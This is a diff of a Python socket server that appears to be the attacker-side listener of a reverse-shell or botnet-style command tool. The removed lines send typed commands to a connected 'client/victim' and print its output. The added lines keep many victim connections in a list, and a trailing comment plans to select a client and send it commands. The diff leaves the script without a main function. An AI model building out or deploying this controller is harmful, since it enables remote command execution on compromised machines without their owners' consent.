@@ -1,5 +1,15 @@
+import queue
 import socket
 import sys
+from queue import Queue
+import threading
+
+no_of_threads = 2
+job_number = [1,2]
+queue = Queue()
+all_connections = []
+all_addresses = []
+
 
 host = ""
 port = 9999
@@ -23,31 +33,22 @@ def bind_socket():
         print("Error: " + str(socket.error) + "\n" + "Tryng again to bind!")
         bind_socket()
 
-#function for establishing a connection with client (socket must be listening )
-def accept_connection ():
-    print("Accepting the connection!")
-    connection,address  = s.accept()
-    print("Connection established! IP: {} Port: {}".format(address[0],str(address[1])))
-    send_commands(connection)
+#handling connections from multiple clients and saving to a list  (socket must be listening )
+# closing previous connections when server.py file is restarted
 
-#send commands to a client/victim
-def send_commands(connection):
+def accepting_connection():
+    for connection in all_connections:
+        connection.close()
+    del all_connections[:]
+    del all_addresses[:]
     while True:
-        cmd = input()
-        if cmd == "quit":
-            connection.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            print("Sending the command over the connection!")
-            connection.send(str.encode(cmd))
-            print("Data received from the client: " + "\n")
-            client_response_byte  = connection.recv(2048)
-            client_response_str = client_response_byte.decode("utf-8")
-            print(client_response_str, end=" ")
+        try:
+            connection,address = s.accept()
+            s.setblocking(1) # prevents timeout
+            all_connections.append(connection)
+            all_addresses.append(address)
+            print("Connection has been established | IP: {} | Port {}".format(address[0], str(address[1])))
+        except:
+            print("Error: " + str(socket.error))
 
-def main():
-    create_socket()
-    bind_socket()
-    accept_connection()
-main()
+# 2nd thread functions 1-) see all clients 2-) select a client 3-) send command to the client 
